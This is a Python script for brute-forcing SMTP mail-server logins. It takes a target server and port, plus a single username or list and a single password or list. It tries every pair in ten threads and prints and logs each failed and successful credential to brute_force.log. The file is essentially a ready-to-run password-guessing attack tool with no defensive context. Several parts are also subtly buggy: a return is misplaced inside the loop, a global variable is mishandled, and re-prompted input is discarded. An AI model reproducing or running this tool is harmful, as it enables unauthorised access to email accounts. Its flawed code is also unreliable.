import os
import smtplib
import getpass
import timeit
import threading
import logging
import socket
import signal
import concurrent.futures

print("""
               _
 ___ _ __ ___ | |_ _ __
/ __| '_ ` _ \| __| '_ \\
\__ \ | | | | | |_| |_) |
|___/_| |_| |_|\__| .__/
                  |_|

""")

# Set up Ctrl+C signal handler
def signal_handler(signal, frame):
    exit_program()

# Register the signal handler
signal.signal(signal.SIGINT, signal_handler)

def exit_program():
    print("\nExiting program...")
    os._exit(0)

found_credentials = False

def get_username(user_input):
    if user_input == "U":
        return [input("Enter username: ")]
    elif user_input == "L":
        file_path = input("Enter the file path: ")
        file_path = rf"{file_path}"
        if os.path.isfile(file_path):
            print(f"The file path is: {file_path}")
            with open(file_path, 'r', encoding='utf-8-sig') as f:
                lines = f.readlines()
                user_list = [line.strip() for line in lines]
            return user_list
        else:
            print('The file does not exist')
    else:
        print('Invalid choice. Please enter U or L.')
        user_input = input("Enter U for a specific user or L for a list of users: ")

def get_password_list(pass_input):
    if pass_input == "P":
        return [getpass.getpass("Enter password: ")]
    elif pass_input == "L":
        file_path = input("Enter the file path: ")
        file_path = rf"{file_path}"
        if os.path.isfile(file_path):
            print(f"The file path is: {file_path}")
            with open(file_path, 'r', encoding='utf-8-sig') as f:
                lines = f.readlines()
                password_list = [line.strip() for line in lines]
            return password_list
        else:
            print('The file does not exist')
    else:
        print('Invalid choice. Please enter P or L.')
        pass_input = input("Enter P for a specific password or L for a list of passwords: ")

def smtp_brute(server, port, username_input, password_input):
    smtp_server = smtplib.SMTP(server, port)

    if isinstance(username_input, str):
        username_list = [username_input]
    else:
        username_list = username_input

    if isinstance(password_input, str):
        password_list = [password_input]
    else:
        password_list = password_input

    found_login = False

    for username in username_list:
        if found_login:
            break

        for password in password_list:
            try:
                smtp_server.login(username, password)
                logging.info(f'Successful login - username: {username}, password: {password}')
                print(f'Successful login - username: {username}, password: {password}')
                smtp_server.quit()
                found_login = True
                break
            except smtplib.SMTPAuthenticationError:
                logging.warning(f'Authentication failed - username: {username}, password: {password}')
                print(f'Authentication failed - username: {username}, password: {password}')
            except (smtplib.SMTPException, socket.error) as e:
                logging.error(
                    f'Error connecting to {server} with username: {username} and password: {password}: {str(e)}')
                if str(e) == "[Errno 111] Connection refused":
                    print("Connection refused. Exiting program...")
                    exit_program()
            if found_login:
                break

            return found_login

def main():
                logging.basicConfig(filename='brute_force.log', level=logging.INFO,
                                    format='%(asctime)s - %(levelname)s - %(message)s')

                server = input("Enter the SMTP server: ")
                port = int(input("Enter the SMTP port: "))

                while True:
                    user_choice = input("Enter U for a specific user or L for a list of users: ")
                    username_input = get_username(user_choice)
                    if username_input is not None:
                        break

                while True:
                    pass_choice = input("Enter P for a specific password or L for a list of passwords: ")
                    password_input = get_password_list(pass_choice)
                    if password_input is not None:
                        break

                start_time = timeit.default_timer()

                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                    futures = []
                    for username in username_input:
                        for password in password_input:
                            future = executor.submit(smtp_brute, server, port, username, password)
                            futures.append(future)

                    for future in concurrent.futures.as_completed(futures):
                        result = future.result()

                        if result:
                            found_credentials = True
                            break

                elapsed_time = timeit.default_timer() - start_time
                print(f"Elapsed time: {elapsed_time:.2f} seconds")

                if not found_credentials:
                    print("Credentials not found.")

if __name__ == "__main__":
    main()
